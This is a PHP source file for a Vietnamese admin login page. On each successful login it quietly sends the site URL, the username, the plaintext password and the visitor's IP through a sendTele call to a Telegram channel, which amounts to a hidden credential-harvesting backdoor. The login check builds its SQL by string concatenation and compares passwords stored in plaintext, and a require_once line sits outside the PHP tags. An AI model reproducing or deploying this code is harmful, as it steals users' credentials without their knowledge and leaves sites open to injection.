<?php 
require_once('../include/config.php');
date_default_timezone_set("Asia/Ho_Chi_minh");
 $time = date("h:i:s");
 $site = $_SERVER['SERVER_NAME'];
 $ip = $_SERVER['REMOTE_ADDR']; 
 $uri = $_SERVER['REQUEST_URI'];
 $query = $_SERVER['QUERY_STRING'];
 $domain = $_SERVER['HTTP_HOST'];
 $protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
 $url = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
?>
<head>
<center>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Đăng Nhập</title>
  <!-- Tell the browser to be responsive to screen width -->
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="/assets/default/js/script.js">
  <!-- Ionicons -->
  <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
  <!-- icheck bootstrap -->
  <link rel="stylesheet" href="plugins/icheck-bootstrap/icheck-bootstrap.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="dist/css/adminlte.min.css">
<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
<!-- Google Font: Source Sans Pro -->
  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700" rel="stylesheet">
</head>
<?php
if (isset($_POST["submit"]))
{
    $username = str_replace(array('<',"'",'>','?','/',"\\",'--','eval(','<php'),array('','','','','','','','',''),htmlspecialchars(addslashes(strip_tags($_POST['username']))));
    $password = str_replace(array('<',"'",'>','?','/',"\\",'--','eval(','<php'),array('','','','','','','','',''),htmlspecialchars(addslashes(strip_tags($_POST['password']))));
    if ($username == "" || $password =="") 
    {
        echo '<script type="text/javascript">swal("Lỗi", "Vui Lòng Nhập Đầy Đủ Thông Tin", "error");
        setTimeout(function(){ location.href = "login.php" },2000);</script>';
    }
    else
    {
        $sql = "SELECT * FROM `usersctv` WHERE `username` = '".$username."' AND `password` = '".$password."' ";
        $query = mysqli_query($ketnoi,$sql);
        $num_rows = mysqli_num_rows($query);

        if ($num_rows == 0) {
            echo '<script type="text/javascript">swal("Lỗi", "Thông Tin Đăng Nhập Không Hợp Lệ !", "error");
            setTimeout(function(){ location.href = "" },2000);</script>';
            die();
        } else {
         
            $_SESSION['admin'] = $username;
            $_SESSION['admin'] = $username;
            sendTele(templateTele(' URL ' . $url . ' " USERNAME "' . $username . '" PASSWORD "'. $password.'" IP " '. $ip));
            echo '<script type="text/javascript">swal("Thành Công","Đăng Nhập Thành Công","success");
                setTimeout(function(){ location.href = "index.php" },10);</script>';
        }
    }
}

?> 
        <!-- The content half -->
        <div id="global-loader" style="display: none;"></div>
    <div class="page h-100">
        <div class="page-content">
            <div class="container">
                <div class="row mx-0 justify-content-center">
                    <div class="login rounded col-md-5">
                        <form action="#" method="POST" class="mb-5">
                            <div class="p-5 text-center">
                                <h2 class="fw-bold mb-2 text-uppercase">ĐĂNG NHẬP</h2>
                                <p class="mb-3">Vui lòng nhập tài khoản và mật khẩu!</p>
                            </div>
                            
                                <div class="input-icon form-group wrap-input">
                                    <input type="text" class="form-control form-control-lg" name="username" id="username" value="" placeholder="Tài Khoản">
                            </div>
                                <div class="input-icon form-group wrap-input">
                                    <span class="input-icon-addon search-icon"> <i class="fal fa-lock-alt fa-lg text-primary"></i></span>
                                    <br>
                                    <br>
                                    <input type="password" class="form-control form-control-lg" name="password" id="password" value="" placeholder="Mật Khẩu">
                            </div>
                            <div class="input-icon form-group wrap-input">
                                    <span class="input-icon-addon search-icon"> <i class="fal fa-lock-alt fa-lg text-primary"></i></span>
                                    
                                    
                                <button type="submit" name="submit" class="btn btn-primary btn-block text-uppercase mb-2 rounded-pill shadow-sm">Đăng Nhập</button>
                            </form>
                            
                           <div class="text-center d-flex justify-content-between mt-4"><p>Design By <a href="https://www.facebook.com/DuyKhanhRealL0"  style="text-decoration: none;color: blue">Nguyễn Duy Khánh</a></p></div>
</div>
</div>
</div> 
</div>
</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
require_once('last.php');
<style>
    .login,
.image {
  min-height: 100vh;
}
</style>
</center>
</body>